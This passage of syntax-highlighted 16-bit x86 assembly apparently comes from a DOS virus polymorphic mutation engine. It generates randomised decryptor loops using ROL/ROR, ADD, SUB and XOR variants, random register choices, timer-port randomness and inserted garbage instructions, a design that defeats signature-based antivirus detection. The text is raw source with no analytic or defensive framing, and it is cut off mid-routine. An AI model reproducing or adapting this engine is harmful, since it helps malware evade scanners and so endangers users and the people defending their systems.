        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">pointer_di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; save pointer position</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">isrolror</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">dontcl</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">make_a_cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b1h</span><span class="sc0">                         </span><span class="sc1">; mov cl,rot_num</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">redorandom</span><span class="sc0">
</span><span class="sc5">make_a_cx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b9h</span><span class="sc0">                         </span><span class="sc1">; mov cx,rot_num</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">redorandom</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">                          </span><span class="sc1">; how many rols/rors</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">redorandom</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cl_move</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">nocx</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">no_cxbadd</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                          </span><span class="sc1">; something for ch</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">no_cxbadd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomshit</span><span class="sc0">                      </span><span class="sc1">; garbage</span><span class="sc0">
</span><span class="sc5">dontcl</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">secphs</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">         </span><span class="sc1">; where we will jump</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomshit</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">withsegmentop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">                          </span><span class="sc1">; PUSH CS</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomshit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">                          </span><span class="sc1">; POP DS</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ds_mody</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">       </span><span class="sc1">; don't use ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">seg_sta</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomshit</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">mathoperation</span><span class="sc0">
</span><span class="sc5">withsegmentop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02eh</span><span class="sc0">                         </span><span class="sc1">; CS:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">mathoperation</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">isrolror</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">puremath</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0d2h</span><span class="sc0">                         </span><span class="sc1">; ROL/ROR base byte</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">isword</span><span class="sc4">],</span><span class="sc2">00</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">rolbyte</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                              </span><span class="sc1">; word = byte +1</span><span class="sc0">
</span><span class="sc5">rolbyte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; first rol/ror byte</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">rollinging</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                          </span><span class="sc1">; roring</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">enc_loop</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">04h</span><span class="sc0">       </span><span class="sc1">; encryptor always with SI</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">rolend</span><span class="sc0">
</span><span class="sc5">rollinging</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">enc_loop</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0ch</span><span class="sc0">       </span><span class="sc1">; ROL/ROR base</span><span class="sc0">
</span><span class="sc5">rolend</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">point_reg</span><span class="sc4">],</span><span class="sc2">06h</span><span class="sc0">        </span><span class="sc1">; ROL/ROR si?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">finish_pointer_ro</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">point_reg</span><span class="sc4">],</span><span class="sc2">07h</span><span class="sc0">        </span><span class="sc1">; ROL/ROR di?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">finish_pointer_ro</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">point_reg</span><span class="sc4">],</span><span class="sc2">03h</span><span class="sc0">        </span><span class="sc1">; ROL/ROR bx?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">finish_pointer_ro</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03fh</span><span class="sc0">                         </span><span class="sc1">; so it is bp</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">seg_sta</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; bp needs 1 byte more</span><span class="sc0">
</span><span class="sc5">finish_pointer_ro</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">nowordi</span><span class="sc0">
</span><span class="sc5">puremath</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc0">                         </span><span class="sc1">; ADD/SUB/XOR base</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">isword</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">goforbyte</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                              </span><span class="sc1">; word = byte +1</span><span class="sc0">
</span><span class="sc5">goforbyte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">                       </span><span class="sc1">; select which</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">34h</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">xoring</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">subbing</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">enc_loop</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">2ch</span><span class="sc0">       </span><span class="sc1">; ADD</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">xoring</span><span class="sc0">
</span><span class="sc5">subbing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">enc_loop</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">04h</span><span class="sc0">       </span><span class="sc1">; SUB</span><span class="sc0">
</span><span class="sc5">xoring</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">point_reg</span><span class="sc4">],</span><span class="sc2">06h</span><span class="sc0">        </span><span class="sc1">; SI?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">finish_pointer</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">point_reg</span><span class="sc4">],</span><span class="sc2">07h</span><span class="sc0">        </span><span class="sc1">; DI?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">finish_pointer</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">point_reg</span><span class="sc4">],</span><span class="sc2">03h</span><span class="sc0">        </span><span class="sc1">; BX?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">finish_pointer</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03fh</span><span class="sc0">                         </span><span class="sc1">; well, BP!</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">seg_sta</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; bp needs 1 byte more</span><span class="sc0">
</span><span class="sc5">finish_pointer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">random_value</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                                  </span><span class="sc1">; one random value</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">isword</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">nowordi</span><span class="sc0">                        </span><span class="sc1">; encrypting words?</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">random_value</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; one more</span><span class="sc0">
</span><span class="sc5">nowordi</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_inc_pointer</span><span class="sc0">                  </span><span class="sc1">; increment pointer</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">isrolror</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">; rol/ror with changing CX</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_cl_change</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_foo_instructions</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">041h</span><span class="sc0">                         </span><span class="sc1">; inc cx</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">increment_cx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                          </span><span class="sc1">; 49h = dec cx</span><span class="sc0">
</span><span class="sc5">increment_cx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">random_value</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; put also in encryptor</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">no_cl_change</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">isword</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">; is word?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">noby</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_inc_pointer</span><span class="sc0">                  </span><span class="sc1">; increment once more</span><span class="sc0">
</span><span class="sc5">noby</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">048h</span><span class="sc0">                         </span><span class="sc1">; dec counter</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">count_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">                 </span><span class="sc1">; CMP or no CMP?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">direct_ncmp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">no_compare</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">can_doda</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">083h</span><span class="sc0">                         </span><span class="sc1">; base for ops</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">no_cmp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc0">                         </span><span class="sc1">; CMP counter,0</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">comp_store</span><span class="sc0">
</span><span class="sc5">no_cmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">oring</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc0">                         </span><span class="sc1">; XOR counter,0</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">comp_store</span><span class="sc0">
</span><span class="sc5">oring</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c8h</span><span class="sc0">                         </span><span class="sc1">; OR  counter,0</span><span class="sc0">
</span><span class="sc5">comp_store</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">count_reg</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; store op</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; CMP/XOR/OR counter,0</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">direct_ncmp</span><span class="sc0">
</span><span class="sc5">no_compare</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">do_with_and</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc0">                          </span><span class="sc1">; OR counter,counter</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">second_operand</span><span class="sc0">
</span><span class="sc5">do_with_and</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">23h</span><span class="sc0">
</span><span class="sc5">second_operand</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">                         </span><span class="sc1">; AND counter,counter</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">count_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">instr_change</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">direct_ncmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; random in cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">secphs</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; check lenght of the jump</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">; of the decryption loop</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">must_be_long</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ff83h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">do_short_jump</span><span class="sc0">

</span><span class="sc5">must_be_long</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                          </span><span class="sc1">; for the jz forward</span><span class="sc0">

